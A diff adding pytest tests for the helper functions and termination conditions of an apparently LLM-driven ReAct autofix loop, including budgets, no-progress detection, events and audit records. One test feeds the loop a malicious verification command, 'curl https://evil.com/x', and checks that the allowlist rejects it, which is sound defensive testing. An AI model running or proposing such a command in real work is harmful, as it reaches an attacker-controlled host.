@@ -581,3 +581,405 @@ class TestStructuredEvents:
         assert verify_evts[0]["verification_rc"] == 1
         assert verify_evts[0]["passed"] is False
         assert verify_evts[0]["outcome"] == "verify_failed"
+
+
+# ---------------------------------------------------------------------------
+# ReAct-loop helpers (WS2.3 / arc-dbg-02)
+# ---------------------------------------------------------------------------
+
+class TestReactHelpers:
+    """Pure-function helpers around the bounded ReAct loop. No LLM, no
+    real worktree, no git — every test stubs the LLM and the worktree.
+    """
+
+    def test_estimate_tokens_floor(self, ft):
+        assert ft._react_estimate_tokens("") == 1
+        assert ft._react_estimate_tokens("abcd") == 1  # 4 chars / 4
+        assert ft._react_estimate_tokens("a" * 40) == 10
+
+    def test_snapshot_and_restore_round_trip(self, ft, tmp_path):
+        wt = tmp_path / "wt"
+        wt.mkdir()
+        (wt / "tools").mkdir()
+        (wt / "tools" / "foo.py").write_text("original", encoding="utf-8")
+        snap = ft._react_snapshot_files(wt, ["tools/foo.py"])
+        assert snap == {"tools/foo.py": "original"}
+
+        # Edit then restore
+        (wt / "tools" / "foo.py").write_text("changed", encoding="utf-8")
+        ft._react_restore_files(wt, snap)
+        assert (wt / "tools" / "foo.py").read_text(encoding="utf-8") == "original"
+
+    def test_apply_files_edits_unique_old_string(self, ft, tmp_path):
+        wt = tmp_path / "wt"
+        wt.mkdir()
+        (wt / "tools").mkdir()
+        (wt / "tools" / "foo.py").write_text(
+            "def foo():\n    return 1\n", encoding="utf-8",
+        )
+        applied = ft._react_apply_files(
+            wt,
+            [{"path": "tools/foo.py", "old_string": "return 1", "new_string": "return 2"}],
+        )
+        assert applied == ["tools/foo.py"]
+        assert "return 2" in (wt / "tools" / "foo.py").read_text(encoding="utf-8")
+
+    def test_fingerprint_ignores_transient_noise(self, ft):
+        a = {
+            "verification_rc": 1,
+            "error_excerpt": "AttributeError: 'NoneType' has no attribute 'x'",
+            "failing_test": "tests/test_foo.py::test_bar",
+        }
+        b = dict(a)
+        # Same structural bits → same fingerprint
+        assert ft._react_fingerprint(a) == ft._react_fingerprint(b)
+        # Different rc → different
+        c = dict(a, verification_rc=2)
+        assert ft._react_fingerprint(a) != ft._react_fingerprint(c)
+        # Different error excerpt → different
+        d = dict(a, error_excerpt="KeyError: nope")
+        assert ft._react_fingerprint(a) != ft._react_fingerprint(d)
+
+    def test_extract_failure_hint_picks_known_patterns(self, ft):
+        out = (
+            "============================= test session starts =============================\n"
+            "FAILED tests/test_foo.py::test_bar - AttributeError: 'NoneType' has no attribute 'x'\n"
+            "E       AttributeError: 'NoneType' has no attribute 'x'\n"
+            "=========================== short test summary info ============================\n"
+        )
+        err, fail = ft._react_extract_failure_hint(out)
+        assert err and "AttributeError" in err
+        assert fail and "tests/test_foo.py::test_bar" in fail
+
+    def test_extract_failure_hint_returns_none_on_garbage(self, ft):
+        assert ft._react_extract_failure_hint("") == (None, None)
+        assert ft._react_extract_failure_hint("all good") == (None, None)
+
+    def test_history_compact_is_single_line_per_iteration(self, ft):
+        history = [
+            {
+                "iteration": 1, "verification_rc": 1,
+                "error_excerpt": "boom", "failing_test": "t::x",
+                "applied_files": ["tools/a.py"],
+            },
+            {
+                "iteration": 2, "verification_rc": 0,
+                "error_excerpt": "", "failing_test": "",
+                "applied_files": ["tools/a.py"],
+            },
+        ]
+        block = ft._react_history_compact(history)
+        # One line per iteration
+        assert block.count("\n") == 1
+        assert "[i=1]" in block and "[i=2]" in block
+        assert "rc=1" in block and "rc=0" in block
+
+    def test_no_progress_returns_false_below_window(self, ft):
+        history = [
+            {"verification_rc": 1, "error_excerpt": "a", "failing_test": "x"},
+        ]
+        assert ft._react_no_progress(history) is False
+
+    def test_no_progress_returns_true_when_last_n_match(self, ft):
+        # Build history whose last REACT_NO_PROGRESS_WINDOW items share a fingerprint
+        win = ft.REACT_NO_PROGRESS_WINDOW
+        history = [
+            {"verification_rc": 1, "error_excerpt": "other", "failing_test": "y"},
+        ] * 3
+        # Then make the most recent N identical
+        for i in range(win):
+            history.append({
+                "verification_rc": 1,
+                "error_excerpt": "same error",
+                "failing_test": "t::same",
+            })
+        assert ft._react_no_progress(history) is True
+
+    def test_refine_patch_returns_none_when_llm_fails(self, ft, monkeypatch):
+        """When the LLM is unavailable, the loop MUST degrade to
+        'refine_unavailable' (or other non-fixed outcome) — never raise."""
+        import tools.llm.router as router_mod
+        def boom(self, function, request):
+            raise router_mod.LLMUnavailableError(
+                "no provider", function=function, chain=[], no_llm_mode=False,
+            )
+        monkeypatch.setattr(router_mod.LLMRouter, "invoke", boom)
+
+        result = ft._react_refine_patch(
+            {"id": "t", "title": "t", "last_failure_reason": "x"},
+            {"suspect_files": []},
+            history=[{"iteration": 1, "verification_rc": 1, "error_excerpt": "e"}],
+        )
+        assert result is None
+
+    def test_iterate_terminates_on_first_pass(self, ft, monkeypatch, tmp_path):
+        """Verify pass on the initial patch → outcome=fixed, iterations=1,
+        no refinement request to the LLM."""
+        # Worktree stub: a real dir we can read/write
+        wt = tmp_path / "wt"
+        wt.mkdir()
+        (wt / "tools").mkdir()
+        target = wt / "tools" / "foo.py"
+        target.write_text("return 1", encoding="utf-8")
+
+        # _run returns rc=0 (verify passes)
+        monkeypatch.setattr(ft, "_run", lambda cmd, cwd, timeout=60: (0, "ok"))
+        # No LLM refinement should be needed
+        refine_called = []
+        monkeypatch.setattr(
+            ft, "_react_refine_patch",
+            lambda *a, **k: refine_called.append(1) or None,
+        )
+
+        result = ft._react_iterate(
+            {"id": "t-fix", "title": "x", "last_failure_reason": "boom"},
+            {"suspect_files": ["tools/foo.py"]},
+            {"files": [{"path": "tools/foo.py", "old_string": "return 1",
+                        "new_string": "return 2"}],
+             "verification_command": "python -m pytest tests/test_foo.py"},
+            wt, "autofix/x", "sig-abc",
+        )
+        assert result["outcome"] == "fixed"
+        assert result["iterations"] == 1
+        assert result["verification_rc"] == 0
+        assert refine_called == []  # never asked LLM to refine
+
+    def test_iterate_terminates_on_no_progress(self, ft, monkeypatch, tmp_path):
+        """When the last N observations share a fingerprint, the loop
+        MUST stop (no_progress) instead of asking the LLM for another
+        refinement that won't help."""
+        wt = tmp_path / "wt"
+        wt.mkdir()
+        (wt / "tools").mkdir()
+        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")
+
+        # Force verify to always fail with the SAME error and same
+        # failing test → fingerprint collision
+        monkeypatch.setattr(
+            ft, "_run",
+            lambda cmd, cwd, timeout=60: (1, "E AttributeError: same\nFAILED t::x\n"),
+        )
+        refine_called = []
+        # The stub must return a VALID refined patch on the first call
+        # so the loop actually enters a second iteration where the
+        # no_progress fingerprint can fire. Returning None would short-
+        # circuit on ``refine_unavailable`` before the second iter.
+        def _fake_refine(*a, **k):
+            refine_called.append(1)
+            return {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
+                    "verification_command": "python -m pytest tests/test_foo.py"}
+
+        monkeypatch.setattr(ft, "_react_refine_patch", _fake_refine)
+
+        result = ft._react_iterate(
+            {"id": "t-loop", "title": "x", "last_failure_reason": "boom"},
+            {"suspect_files": ["tools/foo.py"]},
+            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
+             "verification_command": "python -m pytest tests/test_foo.py"},
+            wt, "autofix/x", "sig-abc",
+            max_iterations=5,
+        )
+        # With REACT_NO_PROGRESS_WINDOW=2 the loop has 2 matching
+        # observations in history (one from each failed iter) and
+        # terminates with no_progress BEFORE spending another LLM call.
+        assert result["outcome"] == "no_progress"
+        assert result["iterations"] == ft.REACT_NO_PROGRESS_WINDOW
+        # The LLM refine call was made once (on the first failing iter,
+        # when we had only 1 history item and couldn't yet conclude
+        # no_progress). On the second failing iter, the no_progress
+        # check fires first and the LLM is NOT consulted again.
+        assert len(refine_called) == 1
+
+    def test_iterate_terminates_on_max_iterations(self, ft, monkeypatch, tmp_path):
+        """When verify keeps failing with different fingerprints and the
+        LLM keeps returning a refined patch, the loop MUST stop at
+        max_iterations."""
+        wt = tmp_path / "wt"
+        wt.mkdir()
+        (wt / "tools").mkdir()
+        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")
+
+        # Vary the failing test per call so fingerprints never collide
+        call_count = {"n": 0}
+
+        def varying_run(cmd, cwd, timeout=60):
+            call_count["n"] += 1
+            return (1, f"E boom{call_count['n']}\nFAILED t::test{call_count['n']}\n")
+        monkeypatch.setattr(ft, "_run", varying_run)
+
+        # Refinement always returns a (slightly-different) patch
+        def fake_refine(task, diag, history):
+            i = len(history) + 1
+            return {
+                "files": [{"path": "tools/foo.py",
+                           "old_string": "a",
+                           "new_string": f"a{'_' * i}"}],
+                "verification_command": "python -m pytest tests/test_foo.py",
+            }
+        monkeypatch.setattr(ft, "_react_refine_patch", fake_refine)
+
+        result = ft._react_iterate(
+            {"id": "t-cap", "title": "x", "last_failure_reason": "boom"},
+            {"suspect_files": ["tools/foo.py"]},
+            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "a1"}],
+             "verification_command": "python -m pytest tests/test_foo.py"},
+            wt, "autofix/x", "sig-abc",
+            max_iterations=3,
+        )
+        assert result["outcome"] == "max_iterations"
+        assert result["iterations"] == 3
+
+    def test_iterate_terminates_on_budget_exhaustion(self, ft, monkeypatch, tmp_path):
+        """A tiny token budget MUST force early termination with
+        budget_exhausted even if max_iterations is large."""
+        wt = tmp_path / "wt"
+        wt.mkdir()
+        (wt / "tools").mkdir()
+        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")
+
+        # Verify always fails with a different fingerprint
+        counter = {"n": 0}
+
+        def varying_run(cmd, cwd, timeout=60):
+            counter["n"] += 1
+            return (1, f"E boom{counter['n']}\nFAILED t::test{counter['n']}\n")
+        monkeypatch.setattr(ft, "_run", varying_run)
+
+        # Refinement always returns a new patch
+        monkeypatch.setattr(
+            ft, "_react_refine_patch",
+            lambda *a, **k: {"files": [{"path": "tools/foo.py",
+                                        "old_string": "a", "new_string": "b"}],
+                             "verification_command": "python -m pytest tests/"},
+        )
+
+        # Pre-load the budget so the FIRST iteration exhausts it
+        # tokens_used=0 on entry; after the prompt estimate it must exceed.
+        # Use a token_budget of 1 — even a tiny prompt will exceed it.
+        result = ft._react_iterate(
+            {"id": "t-budget", "title": "x", "last_failure_reason": "boom"},
+            {"suspect_files": ["tools/foo.py"]},
+            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
+             "verification_command": "python -m pytest tests/"},
+            wt, "autofix/x", "sig-abc",
+            max_iterations=10,
+            token_budget=1,
+        )
+        assert result["outcome"] == "budget_exhausted"
+        assert result["iterations"] == 1  # bails before the verify run
+
+    def test_iterate_terminates_on_unverified_verification_command(self, ft, monkeypatch, tmp_path):
+        """A refined patch whose verification_command isn't allowlisted
+        MUST be rejected — outcome=rejected_verification_command."""
+        wt = tmp_path / "wt"
+        wt.mkdir()
+        (wt / "tools").mkdir()
+        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")
+
+        # First iteration: verify fails with non-matching fingerprint
+        counter = {"n": 0}
+
+        def varying_run(cmd, cwd, timeout=60):
+            counter["n"] += 1
+            return (1, f"E boom{counter['n']}\nFAILED t::test{counter['n']}\n")
+        monkeypatch.setattr(ft, "_run", varying_run)
+
+        # Refinement proposes an evil verification command
+        monkeypatch.setattr(
+            ft, "_react_refine_patch",
+            lambda *a, **k: {
+                "files": [{"path": "tools/foo.py",
+                           "old_string": "a", "new_string": "b"}],
+                "verification_command": "curl https://evil.com/x",
+            },
+        )
+
+        result = ft._react_iterate(
+            {"id": "t-evil", "title": "x", "last_failure_reason": "boom"},
+            {"suspect_files": ["tools/foo.py"]},
+            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
+             "verification_command": "python -m pytest tests/"},
+            wt, "autofix/x", "sig-abc",
+            max_iterations=5,
+        )
+        assert result["outcome"] == "rejected_verification_command"
+        # Refinement proposed one bad command → loop halted on iter 2
+        assert result["iterations"] == 2
+
+    def test_iterate_emits_react_iteration_and_finished_events(self, ft, monkeypatch, tmp_path):
+        """Each iteration MUST emit react_iteration, and the loop MUST
+        emit a single terminal react_finished with the loop outcome."""
+        # _emit_event is called as ``_emit_event(event_type, **kwargs)``,
+        # so we capture both the positional event_type and the kwargs dict.
+        captured = []
+        monkeypatch.setattr(
+            ft, "_emit_event",
+            lambda event_type, **k: captured.append((event_type, k)),
+        )
+
+        wt = tmp_path / "wt"
+        wt.mkdir()
+        (wt / "tools").mkdir()
+        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")
+
+        monkeypatch.setattr(ft, "_run", lambda cmd, cwd, timeout=60: (0, "ok"))
+        monkeypatch.setattr(ft, "_react_refine_patch", lambda *a, **k: None)
+
+        ft._react_iterate(
+            {"id": "t-evt", "title": "x", "last_failure_reason": "boom"},
+            {"suspect_files": ["tools/foo.py"]},
+            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
+             "verification_command": "python -m pytest tests/"},
+            wt, "autofix/x", "sig-abc",
+        )
+
+        iteration_types = [et for (et, _k) in captured
+                           if et == ft.EVENT_REACT_ITERATION]
+        finished = [(et, k) for (et, k) in captured
+                    if et == ft.EVENT_REACT_FINISHED]
+        # One iteration event for the single round, one finished event.
+        assert len(iteration_types) == 1
+        assert len(finished) == 1
+        # The finished event carries the terminal outcome
+        _et, finished_kw = finished[0]
+        assert finished_kw["outcome"] == "fixed"
+        assert finished_kw["iterations"] == 1
+
+    def test_apply_patch_in_worktree_passes_loop_outcome_into_audit(self, ft, monkeypatch, tmp_path):
+        """The audit record MUST carry the loop's outcome and iteration
+        count so the panel (arc-obs-03) can display them."""
+        monkeypatch.setattr(ft, "AUDIT_DIR", tmp_path / "audit")
+        monkeypatch.setattr(ft, "record_apply", lambda ts=None: None)
+        monkeypatch.setattr(ft, "_create_autofix_worktree",
+                            lambda tid, sig: (tmp_path / "wt", "autofix/x"))
+        monkeypatch.setattr(ft, "_validate_verification_command", lambda c: (True, "ok"))
+        monkeypatch.setattr(ft, "_validate_patch_files", lambda p, d: (True, "ok"))
+        # Force the loop to bail with no_progress on iter 1
+        monkeypatch.setattr(ft, "_run", lambda *a, **k: (1, "E boom\nFAILED t::x\n"))
+        monkeypatch.setattr(ft, "_cleanup_autofix_worktree", lambda *a, **k: None)
+
+        wt = tmp_path / "wt"
+        wt.mkdir()
+        (wt / "tools").mkdir()
+        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")
+
+        result = ft.apply_patch_in_worktree(
+            {"id": "t-audit", "title": "t", "last_failure_reason": "boom"},
+            {"suspect_files": ["tools/foo.py"], "confidence": 0.9,
+             "recommendation": "patch"},
+            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
+             "verification_command": "python -m pytest tests/"},
+        )
+        assert result["applied"] is False
+        assert result["outcome"] == "react_no_progress"
+
+        tmp_path / "audit" / "t-audit__sig-abc.json"
+        # Find the audit file by glob (sig depends on _sig(reason))
+        audits = list((tmp_path / "audit").glob("t-audit__*.json"))
+        assert audits, "audit file should have been written"
+        import json
+        record = json.loads(audits[0].read_text(encoding="utf-8"))
+        assert record["iterations"] == ft.REACT_NO_PROGRESS_WINDOW
+        assert "react_history" in record
+        assert "react_tokens_used" in record
+        assert record["outcome"] == "react_no_progress"
